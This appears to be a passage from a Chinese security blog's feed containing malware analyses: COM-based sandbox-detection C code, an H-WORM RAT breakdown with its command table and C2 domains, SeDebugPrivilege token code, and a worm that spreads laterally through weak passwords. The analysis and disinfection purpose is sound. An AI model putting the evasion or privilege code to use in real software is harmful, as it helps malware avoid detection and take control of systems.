+    <url>2019/09/04/Com%E6%B7%BB%E5%8A%A0%E8%BF%87%E6%BB%A4%E5%99%A8%E6%9D%A5%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1/</url>
+    
+    <content type="html"><![CDATA[<p>因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。</p><p>但经测试 <code>any.run</code> 和<code>微步</code> 都未被识别为沙箱</p><p>这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;conio.h&gt;#include &lt;windows.h&gt;#include &lt;dshow.h&gt;#include &lt;objbase.h&gt;#pragma comment(lib, &quot;Strmiids.lib&quot;)void useCom(){    /*    这些只是一些随机检查，以确保恶意软件在真实系统上执行。    只有安装了音频设备，此处的沙箱才会被视为真实系统。    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。    */    CoInitialize(0);    wchar_t * filerName = L&quot;random_name&quot;;    IGraphBuilder * pGraph;    CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&amp;pGraph);    if (E_POINTER != pGraph-&gt;AddFilter(NULL, filerName))    {        MessageBox(0,L&quot;E_POINTER != pGraph-&gt;AddFilter&quot;,0,0);        ExitProcess(-1);    }    //对一个简单的音频渲染器进行硝化，不检查错误代码，但是失败后pBaseFilter将被设置为NULL    IBaseFilter *pBaseFile;    CoCreateInstance(CLSID_AudioRender, NULL, CLSCTX_INPROC_SERVER, IID_IBaseFilter, (void**)&amp;pBaseFile);    //试图找到刚刚添加的过滤器;如果以前未检查任何错误（或错误的仿真），此功能将无法找到过滤器，并且将成功检测到沙箱/仿真器。    pGraph-&gt;AddFilter(pBaseFile, filerName);    IBaseFilter *pBaseFile2;    pGraph-&gt;FindFilterByName(filerName, &amp;pBaseFile2);    if (pBaseFile2 == NULL)    {        MessageBox(0,L&quot;pBaseFile2==Null!!!&quot;,0,0);        ExitProcess(1);    }    //检查achName是不是之前添加的过滤器名    FILTER_INFO info = { 0 };    pBaseFile2-&gt;QueryFilterInfo(&amp;info);    if (wcscmp(info.achName,filerName)!=0)    {        MessageBox(0,L&quot;pBaseFile2 AddFilter error&quot;,0,0);        exit(0);    }    IReferenceClock *pClock;    if (pBaseFile2-&gt;GetSyncSource(&amp;pClock))    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetSyncSource&quot;,0,0);        exit(0);    }    if (pClock != NULL)    {        exit(0);    }    CLSID clsID;    pBaseFile2-&gt;GetClassID(&amp;clsID);    if (clsID.Data1 == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;GetClassID&quot;,0,0);        exit(1);    }    if (pBaseFile2 ==NULL)    {        MessageBox(0,L&quot;pBaseFile2 ==NULL&quot;,0,0);        exit(1);    }    IEnumPins *pEnum = NULL;    if (pBaseFile2-&gt;EnumPins(&amp;pEnum)!=0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;EnumPins&quot;,0,0);        exit(-1);    }    //AddRef返回的引用计数必须大于0    if (pBaseFile2-&gt;AddRef() == 0)    {        MessageBox(0,L&quot;pBaseFile2-&gt;AddRef()&quot;,0,0);        exit(-1);    }}int _tmain(int argc, _TCHAR* argv[]){    useCom();    MessageBox(0,L&quot;没有沙箱!!!\n&quot;,0,0);    return 0;}</code></pre><p>IDA反编译结果</p><p><img src="https://img-blog.csdnimg.cn/20190905142026524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>检测沙箱</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>H-WORM变种远控分析</title>
+    <link href="undefined2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/"/>
+    <url>2019/09/04/H-WORM%E5%8F%98%E7%A7%8D%E8%BF%9C%E6%8E%A7%E5%88%86%E6%9E%90/</url>
+    
+    <content type="html"><![CDATA[<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>4gdrwceq60b7dbl.sct</td><td>rat</td><td>69B7D326575C5616D82645960B3D081A</td><td>403845 bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190916190802115.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>这个样本母体总共会释放3个脚本</p><h3 id="脚本1"><a href="#脚本1" class="headerlink" title="脚本1"></a>脚本1</h3><p>首先我们看看<code>4gdrwceq60b7dbl.sct</code>，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件<br>我们用<code>Sublimi Text</code>来打开它，记事本也是可以的。</p><p><img src="https://img-blog.csdnimg.cn/20190916155338357.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>利用组数来存关键字符串，通过字符串的拼接来合成完整路径<br>会尝试删除<code>%APPDATA%\\taskmgr.js</code>  这个文件<br><img src="https://img-blog.csdnimg.cn/20190916155609819.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190916160236624.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>文件中有很长一段密文，这里我改名为了<code>EncodeList</code>，通过<code>System.IO.MemoryStream.WriteByte()</code>方法把数据读入数据流中。<br>最重要的是使用<code>ADODB.Stream</code>类方法把这个数据流保存到了被上面删除掉的<code>%APPDATA%\\taskmgr.js</code>文件中<br><img src="https://img-blog.csdnimg.cn/20190916155832544.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>最后使用<code>WScript.Shell.Run</code>方法运行<code>taskmgr.js</code>文件</p><p>我这里使Python给他拿出来，命名为<code>taskmgr.js</code><br><img src="https://img-blog.csdnimg.cn/20190916161513776.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本2"><a href="#脚本2" class="headerlink" title="脚本2"></a>脚本2</h3><p>下面是<code>taskmgr.js</code> ，这个脚本其实还是一个解密脚本，也是 使用<code>AdoDB.Stream</code>处理数据流，然后使用<code>monKeyKing</code>中动态生成的eval方法去执行数据，来达到免杀<br><img src="https://img-blog.csdnimg.cn/20190916162014581.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>通过一个<code>Microsoft.XmlDom</code>的创建一个<code>tmp</code>对象，然后把这个对象赋予<code>eval</code>方法<br>最后就可以用<code>this.p</code>去访问到<code>Microsoft.XmlDom.tmp</code>，来达到命令执行<br><img src="https://img-blog.csdnimg.cn/20190916162041325.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>当然执行的命令也肯定是被加过密的，下面就是解密数据部分，这里就简单的把base64后的结果，然后把字符”A”替换成”!-%”<br><img src="https://img-blog.csdnimg.cn/20190916163628179.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>最后使用上面构造的<code>eval</code>去执行这段解密的代码<br><img src="https://img-blog.csdnimg.cn/2019091616391031.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本3-核心代码"><a href="#脚本3-核心代码" class="headerlink" title="脚本3 核心代码"></a>脚本3 核心代码</h3><p>这里开始分析脚本2中解密出来的代码</p><p>根据这host，port和代码量，可以判断出这个应该就是这个样本的实现核心的地方了。<br>这里其实这是一个远控加感染U盘传播</p><h4 id="U盘传播"><a href="#U盘传播" class="headerlink" title="U盘传播"></a>U盘传播</h4><p><img src="https://img-blog.csdnimg.cn/20190916165932567.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>加入开机启动注册表项，来达到持久化攻击，这基本已是木马的共性<br><img src="https://img-blog.csdnimg.cn/20190916170039587.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>在下面的try块中，有一个install函数会被循环调用，这个函数是用来检测感染移动存储设备的<br><img src="https://img-blog.csdnimg.cn/20190916170300961.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>install() 会去判断当前系统磁盘是否有U盘或其他移动存储介质，有的话就执行感染操作<br><img src="https://img-blog.csdnimg.cn/20190916170657111.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>枚举移动盘文件<br><img src="https://img-blog.csdnimg.cn/20190916171010711.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>如果文件不是快捷方式，那就将权限改为<strong>隐藏</strong>和<strong>系统权限</strong>，然后给他们创建一个同名<code>.lnk</code>的快捷方式<br><img src="https://img-blog.csdnimg.cn/20190916171254264.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>快捷方式被修改为了特殊构造的恶意代码，构造过程如下<br><img src="https://img-blog.csdnimg.cn/20190916171656803.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这样每个文件都会被隐藏，然后生成一个被感染的快捷方式去诱惑其他人点击，只要一点击，就会被感染。</p><h4 id="远控模块"><a href="#远控模块" class="headerlink" title="远控模块"></a>远控模块</h4><p>这个远控一共有<code>26</code>个命令模块，分别是<br>|命令  |含义  |<br>|–|–|<br>|disconnect|   断开连接 |<br>|reboot|   重启脚本 |<br>|shutdown| 关闭脚本 |<br>|excecute| 执行命令  |<br>|install-sdk|  安装SDK |<br>|get-pass|搜集密码  |<br>|get-pass-offline|  获取浏览器密码|<br>|update|    更新|<br>|uninstall| 卸载|<br>|up-n-exec| 请求下载执行文件|<br>|bring-log| 上传日志|<br>|down-n-exec|  下载执行文件 |<br>|filemanager|   文件管理|<br>|rdp|  启动RDP |<br>|keylogger| 启动kleylogger|<br>|offline-keylogger| 启动离线版kerlogger|<br>|browse-logs|   上传日志|<br>|cmd-shell| 执行cmd命令|<br>|get-processes| 枚举进程|<br>|disable-uac|   关闭UAC|<br>|check-eligible|    检测权限|<br>|force-eligible| 暴力提权   |<br>|elevate|  普通提权 |<br>|if-elevate|   检测权限 |<br>|kill-process| 结束进程 |<br>|sleep| 挂起进程|</p><p>这个程序会释放一个脚本到%appdata%下去，命名为<code>aFCnKVCdfY.js</code><br><img src="https://img-blog.csdnimg.cn/20190916164502275.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h3 id="脚本4"><a href="#脚本4" class="headerlink" title="脚本4"></a>脚本4</h3><p>aFCnKVCdfY.js这个和脚本三是一样的，除了域名变了，其他都没变化。</p><p><img src="https://img-blog.csdnimg.cn/20190916174051698.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h2><p><strong>C&amp;C</strong><br>unknownsoft.duckdns.org:7744<br>globalization.duckdns.org:50071</p><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>删除自启动表项<br>HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\scriptName<br>HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\run\scriptName</p><p>删除<br>%appdata%\aFCnKVCdfY.js<br>%temp%\aFCnKVCdfY.js<br>%APPDATA%\taskmgr.js </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>谨防不明来路的邮件，网页 文件要谨慎，要对未知文件表示怀疑，切勿怀着试一试的态度打开</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>样本详细分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Rat H-worm</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>替换特权指令 提升权限</title>
+    <link href="undefined2019/09/03/%E6%9B%BF%E6%8D%A2%E7%89%B9%E6%9D%83%E6%8C%87%E4%BB%A4%20%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/"/>
+    <url>2019/09/03/%E6%9B%BF%E6%8D%A2%E7%89%B9%E6%9D%83%E6%8C%87%E4%BB%A4%20%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/</url>
+    
+    <content type="html"><![CDATA[<p><strong><a href="https://zh.wikipedia.org/wiki/%E7%89%B9%E6%9D%83_(Windows)" target="_blank" rel="noopener">什么是特权</a></strong></p><p><strong>注意，这里说的提权不是从<code>Administrator</code>提升到 <code>System</code>,只是开启一些<code>Administrator</code>组的特殊权限</strong></p><h3 id="Administrator组"><a href="#Administrator组" class="headerlink" title="Administrator组"></a>Administrator组</h3><p>管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是<code>SeDebugPrivilege</code>，要是进程拥有了这个权限，就能对任意进程进行操作（包括<code>system</code>）</p><p><img src="https://img-blog.csdnimg.cn/20190905184130154.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190905190534272.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><blockquote><p>当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。</p></blockquote><p>我要做的就是找到找到一个系统中有<code>SeDebugPrivilege</code>权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了<code>SeDebugPrivilege</code>权限了。这也就是提升权限的核心。</p><p>下图是我使用 <code>OpenProcess</code>对SID为4的系统进程进行操作，且操作权限是<code>PROCESS_ALL_ACCESS</code></p><p><img src="https://img-blog.csdnimg.cn/20190905190019240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>下面看看具体实现</p><pre><code class="c">void CgPivilige(){    BOOL retn;    HANDLE hToken;    retn = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | READ_CONTROL, &amp;hToken);//修改令牌特权值    if (retn != TRUE)    {        printf(&quot;获取令牌句柄失败!&quot; );        return;    }    TOKEN_PRIVILEGES tp; //新特权结构体    LUID Luid;    retn = LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;Luid);//查看具有调试权限的令牌    if (retn != TRUE)    {        printf(&quot;获取Luid失败&quot; );        return;    }    //给TP和TP里的LUID结构体赋值    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = Luid;    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);//调整自己Token为有调试特权的Token    if (GetLastError() != ERROR_SUCCESS)    {        printf(&quot;修改特权不完全或失败!&quot; );    }    else    {        printf(&quot;修改成功!&quot; );    }}</code></pre><p>下面给一个病毒使用的提升权限 IDA伪代码</p><pre><code>int __cdecl reloadToken_4108F0(LPCWSTR lpName){  HANDLE v2; // eax  struct _LUID Luid; // [esp+0h] [ebp-24h]  HANDLE TokenHandle; // [esp+8h] [ebp-1Ch]  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-18h]  if ( !LookupPrivilegeValueW(0, lpName, &amp;Luid) )// lpnmae SedebugPrivilege  查看拥有调试权限的令牌    return 0;  v2 = GetCurrentProcess();  if ( !OpenProcessToken(v2, 0x20028u, &amp;TokenHandle) )// 0x20028 = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY|READ_CONTROL    return 0;  NewState.Privileges[0].Luid = Luid;  NewState.PrivilegeCount = 1;  NewState.Privileges[0].Attributes = 2;  AdjustTokenPrivileges(TokenHandle, 0, &amp;NewState, 0, 0, 0);// 将访问令牌中禁用的权限启用，来达到权限提升  CloseHandle(TokenHandle);  return 1;}</code></pre><h3 id="普通用户组"><a href="#普通用户组" class="headerlink" title="普通用户组"></a>普通用户组</h3><p>普通用户组本身权限就比较少<br><img src="https://img-blog.csdnimg.cn/20190905175911142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20190905183658642.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>Crat是普通用户组成员<br><img src="https://img-blog.csdnimg.cn/20190905191224944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2N5eUFyYXk=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>普通用户一般是没有<code>SeDebugPrivilege</code> 权限的，也就是说这个用户组根本就没这个权限，不是能不能打开的问题，而是根本没有。</p><p>所以普通用户不存在什么使用令牌的权限提升，即使有，都只是很小的一些权限。</p><h4 id="查看进程权限"><a href="#查看进程权限" class="headerlink" title="查看进程权限"></a>查看进程权限</h4><p>程序能运行在<code>low</code> <code>medium</code> <code>hight</code> 三个level下,那怎么在通过代码检测自己拥有什么权限呢？</p><p>通过<code>GetTokenInformation</code>拿到这个进程的<code>TokenInformation</code>信息 再通过比较<code>Label.Sid,</code>的值</p><pre><code class="c">void ShowProcessIntegrityLevel(){    HANDLE hToken;    HANDLE hProcess;    DWORD dwLengthNeeded;    DWORD dwError = ERROR_SUCCESS;    PTOKEN_MANDATORY_LABEL pTIL = NULL;    DWORD dwIntegrityLevel;    hProcess = GetCurrentProcess();    if (OpenProcessToken(hProcess, TOKEN_QUERY |        TOKEN_QUERY_SOURCE, &amp;hToken))    {        // Get the Integrity level.        if (!GetTokenInformation(hToken, TokenIntegrityLevel,            NULL, 0, &amp;dwLengthNeeded))        {            dwError = GetLastError();            if (dwError == ERROR_INSUFFICIENT_BUFFER)            {                pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,                    dwLengthNeeded);                if (pTIL != NULL)                {                    if (GetTokenInformation(hToken, TokenIntegrityLevel,                        pTIL, dwLengthNeeded, &amp;dwLengthNeeded))                    {                        dwIntegrityLevel = *GetSidSubAuthority(pTIL-&gt;Label.Sid,                            (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL-&gt;Label.Sid) - 1));                        if (dwIntegrityLevel &lt; SECURITY_MANDATORY_MEDIUM_RID)                        {                            // Low Integrity                            wprintf(L&quot;Low Integrity Process&quot;);                        }                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp;                            dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID)                        {                            // Medium Integrity                            wprintf(L&quot;Medium Integrity Process&quot;);                        }                        else if (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID)                        {                            // High Integrity                            wprintf(L&quot;High Integrity Process&quot;);                        }                    }                    LocalFree(pTIL);                }            }        }        CloseHandle(hToken);    }}</code></pre><p>参考  <a href="https://www.cnblogs.chom/hqu-ye/articles/4838381.html" target="_blank" rel="noopener">https://www.cnblogs.chom/hqu-ye/articles/4838381.html</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>提权</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>弱口令横向传播</title>
+    <link href="undefined2019/09/02/%E5%88%A9%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%BC%A0%E6%92%AD%E6%A8%AA%E5%90%91%E7%9A%84%E8%BF%9C%E6%8E%A7%E7%BB%84%E4%BB%B6/"/>
+    <url>2019/09/02/%E5%88%A9%E7%94%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%E4%BC%A0%E6%92%AD%E6%A8%AA%E5%90%91%E7%9A%84%E8%BF%9C%E6%8E%A7%E7%BB%84%E4%BB%B6/</url>
+    
+    <content type="html"><![CDATA[<p>@[toc]</p><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>FileName</th><th>FileType</th><th>MD5</th><th>Size</th></tr></thead><tbody><tr><td>sample.exe</td><td>rat</td><td>4D049BC19B03572EF8A00980050BAFFF</td><td>28160 bytes</td></tr></tbody></table><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令<br>该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。</p><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190912201229272.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉</p><p><img src="https://img-blog.csdnimg.cn/20190912110554278.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091211080334.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>点击脱壳之后修复下导入表就好了，修复之后查壳效果<br><img src="https://img-blog.csdnimg.cn/20190912111234244.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h4><p>导入函数<br><img src="https://img-blog.csdnimg.cn/20190912112624974.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>还有很多字符串就不列了，格式都是这种。<br>从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能<br>基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。</p><h4 id="动态加IDA"><a href="#动态加IDA" class="headerlink" title="动态加IDA"></a>动态加IDA</h4><p>该样本定义大量局部变量，使用硬编码方式存储数据<br><img src="https://img-blog.csdnimg.cn/20190912113106227.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>移动到ascii上，右键char就可以看到字符了<br><img src="https://img-blog.csdnimg.cn/20190912113423102.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里创了一个名为121212的互斥体，防止程序多开。</p><p>尝试打开注册表项<code>HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.Net CLR</code><br><img src="https://img-blog.csdnimg.cn/20190912114556853.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>第一次找不到值 直接退出<br>接着就开始创建新线程</p><p>程序中还有一个枚举资源的回调函数，但是并没有执行起来</p><h3 id="线程1"><a href="#线程1" class="headerlink" title="线程1"></a>线程1</h3><p><img src="https://img-blog.csdnimg.cn/20190912114858505.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><p>创建第一个线程<br><img src="https://img-blog.csdnimg.cn/20190912114930476.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>硬编码很多常用账户和弱口令密码<br>下面看看怎么玩的</p><p>首先通过<code>gethostname</code>获取主机信息,然后通过<code>gethostbyname</code>获取主机IP地址，这里默认是掩码为<code>24</code>的网段。</p><p>使用弱口令爆破这个网段的每一台主机</p><p><img src="https://img-blog.csdnimg.cn/2019091213240296.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>分别遍历上面的UserName和PassWord表，调用<code>402A40()</code>函数进行爆破<br>看看具体过程<br><img src="https://img-blog.csdnimg.cn/20190912130116130.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>先尝试连接一波服务器</p><p><img src="https://img-blog.csdnimg.cn/20190912130156139.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>连接好后开始往自生和目标主机的共享目录的的C、D、 E盘写入自身，也就是目前运行这个程序</p><p>最后再使用<code>at</code> 让程序2分钟后执行</p><p>就是这样，程序就开始了横向传播</p><h3 id="线程2"><a href="#线程2" class="headerlink" title="线程2"></a>线程2</h3><p><img src="https://img-blog.csdnimg.cn/20190912140134565.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>创建第二个线程<br>会获取当前日期与<code>20130221</code>比较<br>然后又会创建一个线程<br><img src="https://img-blog.csdnimg.cn/20190912140748479.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>继续看这个Rat线程，这个线程才是这个木马的核心，命令执行<br><img src="https://img-blog.csdnimg.cn/20190912141038643.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091214092223.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>会尝试连接<code>arwah.uy1433.com:8090</code>服务器<br><img src="https://img-blog.csdnimg.cn/20190912141724864.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>向C2发送配置信息，大致内容如下。<br><img src="https://img-blog.csdnimg.cn/20190912142056932.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里还会调用<code>4036c8()</code>来接收命令，用于后面的使用，因为F5效果不理想，看看汇编。<br><img src="https://img-blog.csdnimg.cn/20190912142409368.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>会使用<code>select</code>接收发来的数据</p><p><img src="https://img-blog.csdnimg.cn/2019091214260294.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能1：下载文件执行"><a href="#远控功能1：下载文件执行" class="headerlink" title="远控功能1：下载文件执行"></a>远控功能1：下载文件执行</h4><p>当参数是0x10时，在本地根据开机时间创建一个临时目录，下载远程服务器的文件到这个文件中，然后执行这个程序<br><img src="https://img-blog.csdnimg.cn/20190912143533196.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能2：清除运行记录"><a href="#远控功能2：清除运行记录" class="headerlink" title="远控功能2：清除运行记录"></a>远控功能2：清除运行记录</h4><p>这里会删除之前创建的服务，删除注册表键值对，并且下载一个程序，<br><img src="https://img-blog.csdnimg.cn/20190912144509224.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>删除相应值<br><img src="https://img-blog.csdnimg.cn/20190912145143590.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能3：使用ie访问指定地址"><a href="#远控功能3：使用ie访问指定地址" class="headerlink" title="远控功能3：使用ie访问指定地址"></a>远控功能3：使用ie访问指定地址</h4><p>这个可以进行DDos攻击，或者展示广告页面给被害者。<br><img src="https://img-blog.csdnimg.cn/20190912145226470.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p><h4 id="远控功能4：攻击模块"><a href="#远控功能4：攻击模块" class="headerlink" title="远控功能4：攻击模块"></a>远控功能4：攻击模块</h4><p>下面还有一个用来网络攻击的专用模块<br><img src="https://img-blog.csdnimg.cn/20190916152048725.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019091615140094.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190916151556490.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>其实上面所使用的User-Agent都已经能朔源到这是一个在2008年就存在的DDos攻击的模块</p><h3 id="线程3"><a href="#线程3" class="headerlink" title="线程3"></a>线程3</h3><p>创建一个访问本地的线程，这个线程与线程2有相似的地方，代码重用很多<br><img src="https://img-blog.csdnimg.cn/20190912151723315.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190912153059337.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里做个猜想，这个木马是有目的的，已经在内网环境中有一台ip为<code>192.168.1.107</code>的主机已经被感染，这里说他说是服务器,然后这些被感染的主机都往这个服务器发送消息，接收执行命令。而这个线程就是来收集信息的。</p><h2 id="样本溯源"><a href="#样本溯源" class="headerlink" title="样本溯源"></a>样本溯源</h2><p>arwah.uy1433.com:8090<br>192.168.1.107</p><h2 id="查杀方案"><a href="#查杀方案" class="headerlink" title="查杀方案"></a>查杀方案</h2><p>结束该进程<br>删除木马文件</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个马是有目的性的，攻击目标应该不是面向普通用户，需要和服务器配合，而且木马没有持久化攻击模块，也就是说重启后就没有了，影响不是很大。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>样本详细分析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>malware Rat</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>宏病毒</title>
+    <link href="undefined2019/09/01/%E5%AE%8F%E7%97%85%E6%AF%92%E4%B8%8B%E8%BD%BD%E5%99%A8/"/>
+    <url>2019/09/01/%E5%AE%8F%E7%97%85%E6%AF%92%E4%B8%8B%E8%BD%BD%E5%99%A8/</url>
+    
